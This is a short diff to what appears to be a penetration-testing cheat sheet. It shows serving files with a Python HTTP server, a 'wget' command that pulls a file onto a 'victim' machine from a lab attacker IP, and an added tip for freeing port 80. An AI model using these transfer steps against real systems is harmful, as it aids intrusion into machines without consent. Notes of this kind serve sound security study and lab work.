@@ -144,5 +144,5 @@ Start web server in the current directory on port 80:<br/>
 `python3 -m http.server 80`<br/>
 Upload from victim:<br/>
 `wget 192.168.119.xxx:80/some_file`<br/>
-
+Error message "Address is already in use" -> `lsof -i:80` and kill process.<br/>
 
